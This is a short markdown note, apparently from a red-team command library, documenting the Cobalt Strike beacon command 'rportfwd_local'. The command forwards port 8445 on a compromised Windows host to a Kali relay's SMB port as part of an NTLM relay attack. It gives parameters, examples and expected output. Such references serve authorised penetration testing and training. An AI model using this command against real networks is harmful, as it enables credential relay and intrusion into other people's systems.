---
type: command
executor: beacon
data: rportfwd_local 8445 <IP_KALI> 445
tags:
  - cobalt-strike
  - port-forward
platforms:
  - Windows
verified: true
validated: true
---

# beacon-rportfwd-local-smb-redirect

## Command

```beacon
rportfwd_local 8445 <IP_KALI> 445
```

## Description

This beacon command sets up a local port forward, redirecting connections from the specified local port on the compromised host to a remote host and port (e.g., external relay listener).

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 8445 | Local port on the beacon host to forward from | Yes |
| <IP_KALI> | IP address of the remote host (e.g., Kali relay) | Yes |
| 445 | Remote port (SMB listener) | Yes |

## Examples

### Basic Usage

```beacon
rportfwd_local 8445 192.168.1.50 445
```

### Advanced Usage

```beacon
rportfwd_local -p 8445 192.168.1.50 445
```

## Expected Output

"Added local port forward [8445 -> 192.168.1.50:445]".

## Related

- [[procedures/NTLM-Relay-Attack-via-Cobalt-Strike]]
- [[tools/Cobalt-Strike]]
